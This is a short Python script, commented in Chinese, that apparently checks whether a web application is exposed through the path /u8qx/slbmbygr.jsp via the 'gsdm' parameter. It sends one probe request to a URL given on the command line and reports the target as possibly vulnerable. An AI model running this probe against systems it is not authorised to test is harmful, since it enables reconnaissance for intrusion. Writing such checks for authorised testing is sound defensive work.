import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的GET请求。存在问题的路径为/u8qx/slbmbygr.jsp，参数是gsdm',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送get请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/u8qx/slbmbygr.jsp"  # 移除末尾的斜杠
    else:
        url = args.url + "/u8qx/slbmbygr.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Upgrade-Insecure-Requests': '1',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}

params = {
    'gsdm': '1'
}

response = requests.get(url, params=params)
if "抱歉" in response.text:
    print("目标url："+ url + '\n' +"可能存在该漏洞")
else:
    print("目标url："+ url + '\n' +"不存在该漏洞")
# print(response.text)

